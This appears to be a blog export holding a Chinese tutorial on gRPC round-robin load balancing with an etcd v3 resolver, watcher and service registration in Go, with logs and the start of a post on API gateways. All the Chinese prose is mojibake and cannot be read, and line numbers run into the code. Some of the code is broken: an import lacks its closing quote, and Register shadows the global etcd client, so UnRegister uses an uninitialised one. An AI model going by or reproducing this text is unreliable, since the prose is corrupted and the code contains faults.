Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂÆûÁé∞‰∏Ä‰∏™ÂêçÂ≠óÊúçÂä°Âô®ÁöÑÊé•Âè£ÔºåÁÑ∂ÂêéÂ∞ÅË£ÖÂà∞Ëøô‰∏™Ë¥üËΩΩÂùáË°°Âô®‰∏≠ÔºåËøôÊ†∑Â∞±‰∏çÈúÄË¶ÅËá™Â∑±ÂÆûÁé∞Êï¥‰∏™Ë¥üËΩΩÂùáË°°Âô®„ÄÇÊé•‰∏ãÊù•Êàë‰ª¨ÁªìÂêàetcdv3ÂÆûÁé∞‰∏Ä‰∏™ÂêçËØçËß£ÊûêÊúçÂä°, ÂÆåÊï¥Á§∫‰æã‰ª£ÁêÜ: gRPC LBÁ§∫‰æã‰ª£Á†Å ÂÆûÁé∞ÂêçÁß∞Ëß£ÊûêÊúçÂä° È¶ñÂÖàÂÆö‰πâ‰∏Ä‰∏™resolver, resolverË¶ÅÊ±ÇËøîÂõû‰∏Ä‰∏™ÂÆûÁé∞‰∫ÜwatcherÊé•Âè£ÁöÑÂØπË±°, ËÄåwatcherÈúÄË¶ÅÊúâÊúçÂä°ÂêçÁß∞ÂíåetcdÂÆ¢Êà∑Á´ØÊâçËÉΩËß£ÊûêÂá∫ÁúüÊ≠£ÁöÑÊúçÂä°Âú∞ÂùÄ: resolver.go 123456789101112131415161718192021222324252627282930313233343536373839package lbimport ( "errors" "fmt "strings" etcd3 "github.com/coreos/etcd/clientv3" "google.golang.org/grpc/naming")// resolver is the implementaion of grpc.naming.Resolvertype resolver struct &#123; serviceName string // service name to resolve&#125;// NewResolver return resolver with service namefunc NewResolver(serviceName string) *resolver &#123; return &amp;resolver&#123;serviceName: serviceName&#125;&#125;// Resolve to resolve the service from etcd, target is the dial address of etcd// target example: "http://127.0.0.1:2379,http://127.0.0.1:12379,http://127.0.0.1:22379"func (re *resolver) Resolve(target string) (naming.Watcher, error) &#123; if re.serviceName == "" &#123; return nil, errors.New("grpclb: no service name provided") &#125; // generate etcd client client, err := etcd3.New(etcd3.Config&#123; Endpoints: strings.Split(target, ","), &#125;) if err != nil &#123; return nil, fmt.Errorf("grpclb: creat etcd3 client failed: %s", err.Error()) &#125; // Return watcher return &amp;watcher&#123;re: re, client: *client&#125;, nil&#125; watcherÊåÅÊúâÊúçÂä°ÂêçÁß∞ÂíåetcdÂÆ¢Êà∑Á´Ø,‰ªÖÈúÄË¶ÅË∞ÉÁî®etcdÂÆ¢Êà∑Á´ØÊü•Âá∫ËØ•ÊúçÂä°ÁöÑÂú∞ÂùÄÂàóË°®Âç≥ÂèØ, Êé•‰∏ãÊù•Êàë‰ª¨Âà©Áî®etcdÂÆûÁé∞‰∏Ä‰∏™watcher(ÂÆûÁé∞NextÂíåColseÊñπÊ≥ï): watcher.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package lbimport ( "fmt" etcd3 "github.com/coreos/etcd/clientv3" "golang.org/x/net/context" "google.golang.org/grpc/naming" "github.com/coreos/etcd/mvcc/mvccpb")// watcher is the implementaion of grpc.naming.Watchertype watcher struct &#123; re *resolver // re: Etcd Resolver client etcd3.Client isInitialized bool&#125;// Close do nothingfunc (w *watcher) Close() &#123;&#125;// Next to return the updatesfunc (w *watcher) Next() ([]*naming.Update, error) &#123; // prefix is the etcd prefix/value to watch prefix := fmt.Sprintf("/%s/%s/", Prefix, w.re.serviceName) // check if is initialized // Á¨¨‰∏ÄÊ¨°ÂèäÂàùÂßãÂåñÊó∂ÈúÄË¶ÅËøîÂõû‰∏Ä‰∏™ÂÖ®ÈáèÁöÑÂú∞ÂùÄÁî®‰∫éÊõ¥Êñ∞ if !w.isInitialized &#123; // query addresses from etcd resp, err := w.client.Get(context.Background(), prefix, etcd3.WithPrefix()) w.isInitialized = true if err == nil &#123; addrs := extractAddrs(resp) //if not empty, return the updates or watcher new dir if l := len(addrs); l != 0 &#123; updates := make([]*naming.Update, l) for i := range addrs &#123; updates[i] = &amp;naming.Update&#123;Op: naming.Add, Addr: addrs[i]&#125; &#125; return updates, nil &#125; &#125; &#125; // generate etcd Watcher // ÂàùÂßãÂåñÂêé ÁõëÂê¨ÂèòÈáèÂç≥ÂèØ rch := w.client.Watch(context.Background(), prefix, etcd3.WithPrefix()) for wresp := range rch &#123; for _, ev := range wresp.Events &#123; switch ev.Type &#123; case mvccpb.PUT: return []*naming.Update&#123;&#123;Op: naming.Add, Addr: string(ev.Kv.Value)&#125;&#125;, nil case mvccpb.DELETE: return []*naming.Update&#123;&#123;Op: naming.Delete, Addr: string(ev.Kv.Value)&#125;&#125;, nil &#125; &#125; &#125; return nil, nil&#125;func extractAddrs(resp *etcd3.GetResponse) []string &#123; addrs := []string&#123;&#125; if resp == nil || resp.Kvs == nil &#123; return addrs &#125; for i := range resp.Kvs &#123; if v := resp.Kvs[i].Value; v != nil &#123; addrs = append(addrs, string(v)) &#125; &#125; return addrs&#125; ÂÆûÁé∞ÊúçÂä°ÁöÑÊ≥®ÂÜåÂêçÁß∞Ëß£ÊûêÂÅöÂÆå‰∫Ü, ÈúÄË¶ÅÊúçÂä°Â∞ÜÂú∞ÂùÄÊ≥®ÂÜåÂà∞etcdÁõ∏Â∫îÁöÑÂú∞ÂùÄ‰∏ã12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package lbimport ( "fmt" "log" "strings" "time" etcd3 "github.com/coreos/etcd/clientv3" "github.com/coreos/etcd/etcdserver/api/v3rpc/rpctypes" "golang.org/x/net/context")// Prefix should start and end with no slashvar Prefix = "etcd3_naming"var client etcd3.Clientvar serviceKey stringvar stopSignal = make(chan bool, 1)// Registerfunc Register(name string, host string, port int, target string, interval time.Duration, ttl int) error &#123; serviceValue := fmt.Sprintf("%s:%d", host, port) serviceKey = fmt.Sprintf("/%s/%s/%s", Prefix, name, serviceValue) // get endpoints for register dial address var err error client, err := etcd3.New(etcd3.Config&#123; Endpoints: strings.Split(target, ","), &#125;) if err != nil &#123; return fmt.Errorf("grpclb: create etcd3 client failed: %v", err) &#125; go func() &#123; // invoke self-register with ticker ticker := time.NewTicker(interval) for &#123; // minimum lease TTL is ttl-second resp, _ := client.Grant(context.TODO(), int64(ttl)) // Â¶ÇÊûúÁ¨¨‰∏ÄÊ¨°Ê≥®ÂÜåËØ•keyÂ∞Ü‰∏çÂ≠òÂú®, ÈúÄË¶ÅÂª∫Á´ãkey, Â¶ÇÊûú‰∏çÊòØÁ¨¨‰∏ÄÊ¨°Ê≥®ÂÜå, ÂàôÂà∑Êñ∞ËØ•keyÁöÑÂÄº _, err := client.Get(context.Background(), serviceKey) if err != nil &#123; if err == rpctypes.ErrKeyNotFound &#123; if _, err := client.Put(context.TODO(), serviceKey, serviceValue, etcd3.WithLease(resp.ID)); err != nil &#123; log.Printf("grpclb: set service '%s' with ttl to etcd3 failed: %s", name, err.Error()) &#125; &#125; else &#123; log.Printf("grpclb: service '%s' connect to etcd3 failed: %s", name, err.Error()) &#125; &#125; else &#123; // refresh set to true for not notifying the watcher if _, err := client.Put(context.Background(), serviceKey, serviceValue, etcd3.WithLease(resp.ID)); err != nil &#123; log.Printf("grpclb: refresh service '%s' with ttl to etcd3 failed: %s", name, err.Error()) &#125; &#125; select &#123; case &lt;-stopSignal: return case &lt;-ticker.C: &#125; &#125; &#125;() return nil&#125;// UnRegister delete registered service from etcdfunc UnRegister() error &#123; stopSignal &lt;- true stopSignal = make(chan bool, 1) // just a hack to avoid multi UnRegister deadlock var err error if _, err := client.Delete(context.Background(), serviceKey); err != nil &#123; log.Printf("grpclb: deregister '%s' failed: %s", serviceKey, err.Error()) &#125; else &#123; log.Printf("grpclb: deregister '%s' ok.", serviceKey) &#125; return err&#125; ÂÆûÁé∞ÊúçÂä°Á´ØÂíåÂÆ¢Êà∑Á´Ø ÂÆö‰πâÊúçÂä°Êé•Âè£Â•ëÁ∫¶: hello.proto 12345678910111213141516171819202122232425syntax = &quot;proto3&quot;;option java_multiple_files = true;option java_package = &quot;com.midea.jr.test.grpc&quot;;option java_outer_classname = &quot;HelloWorldProto&quot;;option objc_class_prefix = &quot;HLW&quot;;package helloworld;// The greeting service definition.service Greeter &#123; // Sends a greeting rpc SayHello (HelloRequest) returns (HelloReply) &#123; &#125;&#125;// The request message containing the user&apos;s name.message HelloRequest &#123; string name = 1;&#125;// The response message containing the greetingsmessage HelloReply &#123; string message = 1;&#125; ÊúçÂä°Á´ØÂêØÂä®Êó∂ÈúÄË¶ÅÊ≥®ÂÜå 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package mainimport ( "flag" "fmt" "log" "net" "os" "os/signal" "syscall" "time" "golang.org/x/net/context" "google.golang.org/grpc" pb "golang/grpc/example/pb" grpclb "golang/grpc/lb")var ( serv = flag.String("service", "hello_service", "service name") port = flag.Int("port", 50001, "listening port") reg = flag.String("reg", "http://192.168.204.7:2379", "register etcd address"))func main() &#123; flag.Parse() lis, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *port)) if err != nil &#123; panic(err) &#125; err = grpclb.Register(*serv, "127.0.0.1", *port, *reg, time.Second*10, 15) if err != nil &#123; panic(err) &#125; ch := make(chan os.Signal, 1) signal.Notify(ch, syscall.SIGTERM, syscall.SIGINT, syscall.SIGKILL, syscall.SIGHUP, syscall.SIGQUIT) go func() &#123; s := &lt;-ch log.Printf("receive signal '%v'", s) grpclb.UnRegister() os.Exit(1) &#125;() log.Printf("starting hello service at %d", *port) s := grpc.NewServer() pb.RegisterGreeterServer(s, &amp;server&#123;&#125;) s.Serve(lis)&#125;// server is used to implement helloworld.GreeterServer.type server struct&#123;&#125;// SayHello implements helloworld.GreeterServerfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) &#123; fmt.Printf("%v: Receive is %s\n", time.Now(), in.Name) return &amp;pb.HelloReply&#123;Message: "Hello " + in.Name&#125;, nil&#125; ÂÆ¢Êà∑Á´Ø‰ΩøÁî®round robinË¥üËΩΩÂùáË°°Âô® 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( "flag" "fmt" "time" pb "golang/grpc/example/pb" grpclb "golang/grpc/lb" "strconv" "golang.org/x/net/context" "google.golang.org/grpc")var ( serv = flag.String("service", "hello_service", "service name") reg = flag.String("reg", "http://192.168.204.7:2379", "register etcd address"))func main() &#123; flag.Parse() r := grpclb.NewResolver(*serv) b := grpc.RoundRobin(r) ctx, _ := context.WithTimeout(context.Background(), 10*time.Second) conn, err := grpc.DialContext(ctx, *reg, grpc.WithInsecure(), grpc.WithBalancer(b)) if err != nil &#123; panic(err) &#125; ticker := time.NewTicker(1 * time.Second) for t := range ticker.C &#123; client := pb.NewGreeterClient(conn) resp, err := client.SayHello(context.Background(), &amp;pb.HelloRequest&#123;Name: "world " + strconv.Itoa(t.Second())&#125;) if err == nil &#123; fmt.Printf("%v: Reply is %s\n", t, resp.Message) &#125; &#125;&#125; ÊµãËØïÂêØÂä®3‰∏™ÊúçÂä°Á´Ø123456$go run main.go -port 500012017/08/05 10:57:20 starting hello service at 500012017-08-05 11:02:00.81258994 +0800 CST: Receive is world 02017-08-05 11:02:03.812191776 +0800 CST: Receive is world 32017-08-05 11:02:06.812970792 +0800 CST: Receive is world 62017-08-05 11:02:09.809401404 +0800 CST: Receive is world 9 123456$go run main.go -port 500022017/08/05 10:58:13 starting hello service at 500022017-08-05 11:02:01.812108579 +0800 CST: Receive is world 12017-08-05 11:02:04.811493797 +0800 CST: Receive is world 42017-08-05 11:02:07.808267481 +0800 CST: Receive is world 72017-08-05 11:02:10.808644591 +0800 CST: Receive is world 10 123456$go run main.go -port 500032017/08/05 10:58:42 starting hello service at 500032017-08-05 11:02:02.811818858 +0800 CST: Receive is world 22017-08-05 11:02:05.812063511 +0800 CST: Receive is world 52017-08-05 11:02:08.812688805 +0800 CST: Receive is world 82017-08-05 11:02:11.811770723 +0800 CST: Receive is world 11 ÂêØÂä®ÂÆ¢Êà∑Á´Ø12345678910111213 $go run main.go2017-08-05 11:02:00.812164403 +0800 CST: Reply is Hello world 02017-08-05 11:02:01.811569222 +0800 CST: Reply is Hello world 12017-08-05 11:02:02.811516841 +0800 CST: Reply is Hello world 22017-08-05 11:02:03.811806037 +0800 CST: Reply is Hello world 32017-08-05 11:02:04.811077475 +0800 CST: Reply is Hello world 42017-08-05 11:02:05.811687449 +0800 CST: Reply is Hello world 52017-08-05 11:02:06.812519507 +0800 CST: Reply is Hello world 62017-08-05 11:02:07.807912824 +0800 CST: Reply is Hello world 72017-08-05 11:02:08.812355134 +0800 CST: Reply is Hello world 82017-08-05 11:02:09.809015778 +0800 CST: Reply is Hello world 92017-08-05 11:02:10.808287335 +0800 CST: Reply is Hello world 102017-08-05 11:02:11.81142561 +0800 CST: Reply is Hello world 11 ÊúÄÂêéÊàë‰ª¨ÁúãÁúãetcdÈáåÈù¢Êàë‰ª¨Ê≥®ÂÜåÁöÑÊúçÂä°:1234567root@etcd-node01:~# etcdctl get --prefix --endpoints=192.168.204.7:2379 "/etcd3_naming"/etcd3_naming/hello_service/127.0.0.1:50001127.0.0.1:50001/etcd3_naming/hello_service/127.0.0.1:50002127.0.0.1:50002/etcd3_naming/hello_service/127.0.0.1:50003127.0.0.1:50003 Ââ©‰∏ã‰∫ÜÂÅúÊéâ‰∏Ä‰∫õÊúçÂä°,ÂÆ¢Êà∑Á´ØÊòØÂê¶Ê≠£Â∏∏Â∞±‰Ω†‰ª¨Ëá™Â∑±ÊµãËØï‰∫Ü„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gRPC</tag>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂæÆÊúçÂä°‰πãAPI Gateway]]></title>
    <url>%2F2017%2F08%2F01%2Fapi-gateway%2F</url>
    <content type="text"><![CDATA[ÂæÆÊúçÂä°Êû∂ÊûÑ‰∏≠ÈÇ£‰∫õÂçï‰ΩìÂæÆÊúçÂä°ÂÖ≥Ê≥®‰∏éËá™Ë∫´È¢ÜÂüü, ËÄåAPIGatewayÂÖ≥Ê≥®ÊúçÂä°ÂÖ®Ë≤å, ÊâÄ‰ª•‰ªñÊòØ‰∏Ä‰∏™ÁªüÁ≠πËÄÖ, ÂæàÂ§öÂÖ®Â±ÄÈÉΩÈúÄË¶ÅÁöÑÂäüËÉΩÈúÄË¶ÅÂú®APIGatewayÂ§ÑËøõË°åÂÆûÁé∞, ËøôÁØáÊñáÁ´†ÊòØËÆæËÆ°‰∏Ä‰∏™API GatewayÁöÑÊ¶ÇËø∞, ËÆ≤Ëø∞APIÁΩëÂÖ≥ÁöÑÈúÄÊ±Ç„ÄÅ‰ª∑ÂÄº„ÄÅ‰ª•ÂèäËÆæËÆ°Ë¶ÅÊ±Ç„ÄÇ SOAËÆæËÆ°ÊñπÊ≥ïSOAÊòØ‰∏ÄÁßçÊû∂ÊûÑÁöÑËÆæËÆ°ÊñπÊ≥ï, ÂÖ®Áß∞ÊòØService-Oriented Architecture(Èù¢ÂêëÊúçÂä°ÁöÑÊû∂ÊûÑ)ÔºåÂÆÉÂ∞ÜÂ∫îÁî®Á®ãÂ∫èÁöÑ‰∏çÂêåÂäüËÉΩÂçïÂÖÉÊãÜËß£ÊàêÁã¨Á´ãÁöÑÊúçÂä°, Â§ö‰∏™ÊúçÂä°Áõ¥Êé•ÈÄöËøáËâØÂ•ΩÁöÑÊé•Âè£ÂíåÂ•ëÁ∫¶ËÅîÁ≥ªËµ∑Êù•,ÈááÁî®ÁΩëÁªúËøõË°åÈÄö‰ø°„ÄÇ SOAÂèØ‰ª•ËÆ©ËΩØ‰ª∂Êû∂ÊûÑËææÂà∞ÊùæËÄ¶Âêà, ÂèØ‰ª•Áî®Êù•Â∫îÂØπËáÉËÇøÁöÑÂçï‰ΩìÂ∫îÁî®, ÊØîÂ¶ÇÂ§ö‰∏™ÁªàÁ´ØÁî®Êà∑Â∫îÁî®Á®ãÂ∫èÂèØ‰ª•ÂÖ±‰∫´Âêå‰∏Ä‰∏™ÊúçÂä°, ÂÆÉÁöÑÁõÆÊ†áÊòØÂú®‰∏çÂΩ±ÂìçÂÖ∂‰ªñ‰ªª‰Ωï‰∫∫ÁöÑÊÉÖÂÜµ‰∏ãÈÄèÊòéÂú∞ÊõøÊç¢‰∏Ä‰∏™ÊúçÂä°,Âè™Ë¶ÅÊõøÊç¢‰πãÂêéÁöÑÊúçÂä°ÁöÑÂ§ñÈÉ®Êé•Âè£Ê≤°ÊúâÂ§™Â§ßÁöÑÂèòÂåñÂç≥ÂèØ„ÄÇËøôÁßçÊÄßË¥®ËÉΩÂ§üÂ§ßÂ§ßÁÆÄÂåñËΩØ‰ª∂Áª¥Êä§ÁîöËá≥ÊòØËΩØ‰ª∂ÈáçÂÜôÁöÑËøáÁ®ã„ÄÇ ‰ªÖ‰ªÖËææÂà∞ÊùæËÄ¶ÂêàÊòØ‰∏çÂ§üÁöÑ, ÊùæËÄ¶Âêà‰ºöÂ∏¶Êù•Â§çÊùÇÊÄßÈóÆÈ¢ò, Âõ†Ê≠§ÂêåÊó∂‰πüÈúÄË¶ÅÈ´òÂÜÖËÅö, APIÁΩëÂÖ≥Â∞±ÊòØÁî®Êù•ÂÅöËøô‰∏™ÁöÑ, Âõ†Ê≠§ÂØπÂ§ñÈááÁî®È´òÂÜÖËÅöÁöÑË°®Áé∞ÂΩ¢ÂºèÊù•Èôç‰ΩéÂ§çÊùÇÊÄß, ÂØπÂÜÖÈááÁî®ÊùæËÄ¶ÂêàÁöÑÂÆûÁé∞ÊñπÂºèÊù•Â∫îÂØπÂø´ÈÄüÂèòÂåñÁöÑÈúÄÊ±Ç„ÄÇ ËÉåÊôØ‰ªãÁªçAPIÁΩëÂÖ≥ÁöÑÊµÅË°åÔºåÊ∫ê‰∫éËøëÂá†Âπ¥Êù•ÔºåÁßªÂä®Â∫îÁî®‰∏é‰ºÅ‰∏öÈó¥‰∫íËÅîÈúÄÊ±ÇÁöÑÂÖ¥Ëµ∑„ÄÇÁßªÂä®Â∫îÁî®„ÄÅ‰ºÅ‰∏ö‰∫íËÅîÔºå‰ΩøÂæóÂêéÂè∞ÊúçÂä°ÊîØÊåÅÁöÑÂØπË±°Ôºå‰ªé‰ª•ÂâçÂçï‰∏ÄÁöÑWebÂ∫îÁî®ÔºåÊâ©Â±ïÂà∞Â§öÁßç‰ΩøÁî®Âú∫ÊôØÔºå‰∏îÊØèÁßç‰ΩøÁî®Âú∫ÊôØÂØπÂêéÂè∞ÊúçÂä°ÁöÑË¶ÅÊ±ÇÈÉΩ‰∏çÂ∞ΩÁõ∏Âêå„ÄÇËøô‰∏ç‰ªÖÂ¢ûÂä†‰∫ÜÂêéÂè∞ÊúçÂä°ÁöÑÂìçÂ∫îÈáèÔºåËøòÂ¢ûÂä†‰∫ÜÂêéÂè∞ÊúçÂä°ÁöÑÂ§çÊùÇÊÄß„ÄÇÈöèÁùÄÂæÆÊúçÂä°Êû∂ÊûÑÊ¶ÇÂøµÁöÑÊèêÂá∫ÔºåAPIÁΩëÂÖ≥Êàê‰∏∫‰∫ÜÂæÆÊúçÂä°Êû∂ÊûÑÁöÑ‰∏Ä‰∏™Ê†áÈÖçÁªÑ‰ª∂„ÄÇ ÂÆÉÁî®‰∫éÂ§ÑÁêÜÂæàÂ§öÈÄöÁî®ÁöÑÈóÆÈ¢ò, ÊØîÂ¶ÇËÆøÈóÆËÆ§ËØÅ„ÄÅÊä•ÊñáËΩ¨Êç¢„ÄÅËÆøÈóÆÁªüËÆ°„ÄÅÊúçÂä°ÂèëÁé∞„ÄÅÈôêÊµÅÁ≠âÁ≠â„ÄÇ ‰ΩøÁî®Âú∫ÊôØÁéãÂª∂ÁÇØÂú®Ë∞àAPIÁΩëÂÖ≥ÁöÑËÉåÊôØ„ÄÅÊû∂ÊûÑ‰ª•ÂèäËêΩÂú∞ÊñπÊ°àÊúâÂ¶Ç‰∏ã5ÁßçÂú∫ÊôØ‰ªãÁªç: Èù¢ÂêëWeb AppÁöÑÁΩëÂÖ≥ËøôÁ±ªÂú∫ÊôØÔºåÂú®Áâ©ÁêÜÂΩ¢ÊÄÅ‰∏äÁ±ª‰ººÂâçÂêéÁ´ØÂàÜÁ¶ªÔºåÊ≠§Êó∂ÁöÑWeb AppÂ∑≤Áªè‰∏çÊòØÂÖ®ÂäüËÉΩÁöÑWeb AppÔºåËÄåÊòØÊ†πÊçÆÂú∫ÊôØÂÆöÂà∂„ÄÅÂú∫ÊôØÂåñÁöÑApp„ÄÇ Èù¢ÂêëMobileAppÁöÑÁΩëÂÖ≥ËøôÁ±ªÂú∫ÊôØÔºåÁßªÂä®AppÊòØÂêéÁ´ØServiceÁöÑ‰ΩøÁî®ËÄÖÔºåÊ≠§Êó∂ÁöÑAPIGWËøòÈúÄË¶ÅÊâøÊãÖ‰∏ÄÈÉ®ÂàÜMDMÔºàÊ≠§Â§ÑÊòØÊåáÁßªÂä®ËÆæÂ§áÁÆ°ÁêÜÔºå‰∏çÊòØ‰∏ªÊï∞ÊçÆÁÆ°ÁêÜÔºâÁöÑËÅåËÉΩ„ÄÇ Èù¢ÂêëPartnerOpenAPIÁöÑÁΩëÂÖ≥ËøôÁ±ªÂú∫ÊôØÔºå‰∏ªË¶Å‰∏∫‰∫ÜÊª°Ë∂≥‰∏öÂä°ÂΩ¢ÊÄÅÂØπÂ§ñÂºÄÊîæÔºå‰∏é‰ºÅ‰∏öÂ§ñÈÉ®Âêà‰Ωú‰ºô‰º¥Âª∫Á´ãÁîüÊÄÅÂúàÔºåÊ≠§Êó∂ÁöÑAPI GWÈúÄË¶ÅÂ¢ûÂä†ÈÖçÈ¢ù„ÄÅÊµÅÊéß„ÄÅ‰ª§ÁâåÁ≠â‰∏ÄÁ≥ªÂàóÂÆâÂÖ®ÁÆ°ÊéßÂäüËÉΩ„ÄÇ Èù¢ÂêëPartnerExternalAPIÁöÑÁΩëÂÖ≥ËøôÁ±ªÂú∫ÊôØÔºå‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜÊª°Ë∂≥‰ºÅ‰∏öËá™Ë∫´‰∏öÂä°ÁöÑÈúÄË¶ÅÔºåÂÆûÁé∞ÂØπ‰ºÅ‰∏öËá™Êúâ‰∏öÂä°ÁöÑÊò†Â∞Ñ„ÄÇ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ‰æãÂ≠êÂ∞±ÊòØ‰ΩøÁî®„ÄåÂêà‰ΩúÊñπË¥¶Âè∑ÁôªÂΩï„Äç„ÄÅ„Äå‰ΩøÁî®Á¨¨‰∏âÊñπÊîØ‰ªòÂπ≥Âè∞ÊîØ‰ªò„ÄçÁ≠âÁ≠â„ÄÇÊ≠§Êó∂ÁöÑAPIGWÂ∞±ÈúÄË¶ÅÂú®ËæπÁïå‰∏äÔºå‰∏∫‰ºÅ‰∏öÂÜÖÈÉ®Service Áªü‰∏ÄË∞ÉÁî®Â§ñÈÉ®ÁöÑAPIÂÅöÁªü‰∏ÄÁöÑËÆ§ËØÅ„ÄÅÊéàÊùÉ„ÄÅ‰ª•ÂèäËÆøÈóÆÊéßÂà∂„ÄÇ Èù¢ÂêëIoTSmartDeviceÁöÑÁΩëÂÖ≥ËøôÁ±ªÂú∫ÊôØ‰∏ªË¶ÅÂú®‰º†Áªü‰ºÅ‰∏öÔºåÂ∞§ÂÖ∂ÊòØÂ∑•‰∏ö‰ºÅ‰∏öÔºå‰º†ÊÑüÂô®„ÄÅÁâ©ÁêÜËÆæÂ§á‰ªéÂ∑•‰∏öÊéßÂà∂ÂçèËÆÆÂêëIPËΩ¨Êç¢ÔºåÂØºËá¥Áâ©ÁêÜÈìæË∑Ø‰∏ä‰ºöÂ≠òÂú®‰∏ÄÈÉ®ÂàÜÂÖ¨ÁΩëÈìæË∑Ø„ÄÇÊ≠§Êó∂ÁöÑAPI GWÊâÄÈúÄË¶ÅÊª°Ë∂≥ÁöÑ„ÄåÂÜÖÂ§ñÂÖº‰øÆ„ÄçÁöÑÂèåÂêëÊï∞ÊçÆÊµÅÔºåËÆæÂ§á‰∏ÄËà¨ÈÄöËøá‰∏Ä‰∏™„ÄåÂÆ¢Êà∑‰æß„ÄçÁöÑÈõÜ‰∏≠ÁΩëÂÖ≥Âú®Âíå‰ºÅ‰∏öÁöÑÊé•ÂÖ•ÁΩëÂÖ≥ËøõË°åÈÄö‰ø°„ÄÇ Âú®Êàë‰ª¨ËÆ≤ÁöÑÂæÆÊúçÂä°Êû∂ÊûÑ‰∏ãÁöÑAPIÁΩëÂÖ≥Ôºå‰∏ÄËà¨ÊåáÁöÑÊòØÂâç‰∏§Áßç‰ΩøÁî®Âú∫ÊôØ„ÄÇÂç≥Ôºå‰∏ªË¶ÅÊòØÊää‰ºÅ‰∏öÂÜÖÈÉ®ÁöÑAPIËÉΩÂäõÔºåÊö¥Èú≤ÁªôÂÖ∂‰ªñÂ∫îÁî®ÊàñÂêà‰Ωú‰ºô‰º¥‰ΩøÁî®„ÄÇ ÁΩëÂÖ≥ÁöÑ‰ª∑ÂÄºÁΩëÂÖ≥Â±Ç‰Ωú‰∏∫ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Á´ØÁöÑ‰∏ÄÂ±ÇÊå°ÊùøÔºå‰∏ªË¶ÅËµ∑Âà∞‰∫Ü‰∏âÂ§ßÁ±ª‰ΩúÁî®: ÂÜÖÂ§ñÈöîÁ¶ª: Âº∫Ë∞ÉÂÆâÂÖ®ÊÄß, ‰ºÅ‰∏öÁ≥ªÁªüÁöÑËæπÁïå,ÈöîÁ¶ªÂ§ñÁΩëÁéØÂ¢ÉÂíåÂÜÖÁΩëÁéØÂ¢É„ÄÇ ÊúçÂä°Ëß£ËÄ¶: Êúâ‰∫ÜÁΩëÂÖ≥ÂíåÊúçÂä°Â±ÇÁöÑËß£ËÄ¶, ‰ΩøÂæóÂæÆÊúçÂä°Á≥ªÁªüÁöÑÂêÑÊñπËÉΩÂ§üÁã¨Á´ã„ÄÅËá™Áî±„ÄÅÈ´òÊïà„ÄÅÁÅµÊ¥ªÂú∞Ë∞ÉÊï¥ÔºåËÄå‰∏çÁî®ÊãÖÂøÉÁªôÂÖ∂‰ªñÊñπÈù¢Â∏¶Êù•ÂΩ±Âìç, ‰æø‰∫éÂêÑ‰∏™Âõ¢ÈòüÂ∑•‰ΩúÁöÑÁã¨Á´ãÊÄß„ÄÇ ËæÖÂä©ÂäüËÉΩ: Êèê‰æõ‰∫Ü‰∏Ä‰∏™Âú∞ÁÇπÔºåÊñπ‰æøÈÄöËøáÊâ©Â±ïÊú∫Âà∂ÂØπËØ∑Ê±ÇËøõË°å‰∏ÄÁ≥ªÂàóÂä†Â∑•ÂíåÂ§ÑÁêÜ„ÄÇ ÂÜÖÂ§ñÈöîÁ¶ª‰ºÅ‰∏ö‰∏∫‰∫Ü‰øùÊä§ÂÜÖÈÉ®Á≥ªÁªüÁöÑÂÆâÂÖ®ÊÄßÔºåÂÜÖÁΩë‰∏éÂ§ñÁΩëÈÉΩÊòØÈöîÁ¶ªÁöÑÔºå‰ºÅ‰∏öÁöÑÊúçÂä°Â∫îÁî®ÈÉΩÊòØËøêË°åÂú®ÂÜÖÁΩëÁéØÂ¢É‰∏≠Ôºå‰∏∫‰∫ÜÂÆâÂÖ®ÁöÑËÄÉÈáèÔºå‰∏ÄËà¨ÈÉΩ‰∏çÂÖÅËÆ∏Â§ñÈÉ®Áõ¥Êé•ËÆøÈóÆ„ÄÇAPIÁΩëÂÖ≥ÈÉ®ÁΩ≤Âú®Èò≤ÁÅ´Â¢ôÂ§ñÈù¢ÔºåËµ∑Âà∞‰∏ÄÂ±ÇÊå°Êùø‰ΩúÁî®ÔºåÂÜÖÈÉ®Á≥ªÁªüÂè™Êé•ÂèóAPIÁΩëÂÖ≥ËΩ¨ÂèëËøáÊù•ÁöÑËØ∑Ê±Ç„ÄÇÁΩëÂÖ≥ÈÄöËøáÁôΩÂêçÂçïÊàñÊ†°È™åËßÑÂàôÔºåÂØπËÆøÈóÆËøõË°å‰∫ÜÂàùÊ≠•ÁöÑËøáÊª§„ÄÇÁõ∏ÊØîÈò≤ÁÅ´Â¢ôÔºåËøôÁßçËΩØ‰ª∂ÂÆûÁé∞ÁöÑËøáÊª§ËßÑÂàôÔºåÊõ¥Âä†Âä®ÊÄÅÁÅµÊ¥ª„ÄÇÂú®ÂÆâÂÖ®ÁöÑËßíÂ∫¶ËÄåË®Ä, Ê≠§Êó∂ÁΩëÂÖ≥ÂÖÖÂΩìÁùÄÂ∫îÁî®Èò≤ÁÅ´Â¢ôÁöÑ‰ΩúÁî®(WAF)„ÄÇ 